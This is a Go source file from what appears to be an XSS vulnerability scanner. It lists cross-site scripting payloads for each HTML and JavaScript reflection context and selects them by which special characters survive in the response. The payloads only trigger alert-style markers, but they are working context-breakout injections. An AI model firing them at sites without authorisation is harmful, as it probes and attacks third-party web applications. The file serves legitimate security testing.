package xss

import "strings"

// contextPayloads maps reflection contexts to payloads that are likely to
// execute in those contexts.
var contextPayloads = map[ContextType][]string{
	ContextHTMLText: {
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"<svg><script>alert(1)</script></svg>",
		"<script>alert(1)</script>",
		"<details open ontoggle=alert(1)>",
		"<body onload=alert(1)>",
		"<math><mi><mg src=x onerror=alert(1)>",
		"<iframe srcdoc='<script>alert(1)</script>'>",
	},
	ContextAttributeDoubleQuoted: {
		`" autofocus onfocus=alert(1) x="`,
		`"><img src=x onerror=alert(1)>`,
		`"><svg onload=alert(1)>`,
		`" onmouseover=alert(1) x="`,
		`"><script>alert(1)</script>`,
	},
	ContextAttributeSingleQuoted: {
		`' autofocus onfocus=alert(1) x='`,
		`'><img src=x onerror=alert(1)>`,
		`'><svg onload=alert(1)>`,
		`' onmouseover=alert(1) x='`,
		`'><script>alert(1)</script>`,
	},
	ContextAttributeUnquoted: {
		"autofocus onfocus=alert(1) x=",
		"><img src=x onerror=alert(1)>",
		"><svg onload=alert(1)>",
		" onmouseover=alert(1) x=",
	},
	ContextEventHandler: {
		"alert(1)",
		"alert`1`",
		"alert(document.domain)",
		"confirm(1)",
		"prompt(1)",
	},
	ContextScriptStringDouble: {
		`";alert(1);//`,
		`"-alert(1)-"`,
		`</script><script>alert(1)</script>`,
		`\";alert(1);//`,
	},
	ContextScriptStringSingle: {
		`';alert(1);//`,
		`'-alert(1)-'`,
		`</script><script>alert(1)</script>`,
		`\';alert(1);//`,
	},
	ContextScriptTemplate: {
		"${alert(1)}",
		"`+alert(1)+`",
		"`};alert(1);//",
	},
	ContextScriptBlock: {
		"alert(1)",
		";alert(1);//",
		";alert(1);",
		"</script><script>alert(1)</script>",
	},
	ContextComment: {
		"--><img src=x onerror=alert(1)>",
		"--!><img src=x onerror=alert(1)>",
		"--><svg onload=alert(1)>",
	},
	ContextStyle: {
		"</style><script>alert(1)</script>",
		"</style><img src=x onerror=alert(1)>",
		"</style><svg onload=alert(1)>",
	},
	ContextRCDATA: {
		"</textarea><svg onload=alert(1)>",
		"</title><svg onload=alert(1)>",
		"</textarea><img src=x onerror=alert(1)>",
		"</title><script>alert(1)</script>",
	},
	ContextURLAttribute: {
		"javascript:alert(1)",
		"javascript:alert`1`",
		"data:text/html,<script>alert(1)</script>",
		"javascript:/**/alert(1)",
	},
}

// SelectPayloads returns context-appropriate payloads filtered by reflected
// character survival and capped by max_verification_attempts.
func SelectPayloads(ref ReflectionInfo, params map[string]interface{}) []string {
	payloads := contextPayloads[ref.Context]
	if payloads == nil {
		return nil
	}

	filtered := filterByAvailableChars(payloads, ref.AvailableChars, ref.Context)

	maxAttempts := 3
	if params != nil {
		switch v := params["max_verification_attempts"].(type) {
		case int:
			if v > 0 {
				maxAttempts = v
			}
		case float64:
			if v > 0 {
				maxAttempts = int(v)
			}
		}
	}

	if len(filtered) > maxAttempts {
		return filtered[:maxAttempts]
	}
	return filtered
}

// filterByAvailableChars removes payloads that rely on characters not present
// in the reflected output.
func filterByAvailableChars(payloads []string, chars CharacterSet, ctx ContextType) []string {
	result := make([]string, 0, len(payloads))
	for _, p := range payloads {
		if canUsePayload(p, chars, ctx) {
			result = append(result, p)
		}
	}
	return result
}

// canUsePayload validates whether a payload can be represented in the current
// response context based on available special characters.
func canUsePayload(payload string, chars CharacterSet, ctx ContextType) bool {
	if ctx == ContextHTMLText || ctx == ContextRCDATA || ctx == ContextStyle {
		if !chars.LessThan || !chars.GreaterThan {
			return false
		}
	}
	if strings.Contains(payload, "<") && !chars.LessThan {
		return false
	}
	if strings.Contains(payload, ">") && !chars.GreaterThan {
		return false
	}
	if strings.Contains(payload, "\"") && !chars.DoubleQuote {
		return false
	}
	if strings.Contains(payload, "'") && !chars.SingleQuote {
		return false
	}
	if strings.Contains(payload, "/") && !chars.Slash {
		return false
	}
	if strings.Contains(payload, "`") && !chars.Backtick {
		return false
	}
	if strings.Contains(payload, "(") && !chars.Parenthesis {
		return false
	}
	return true
}
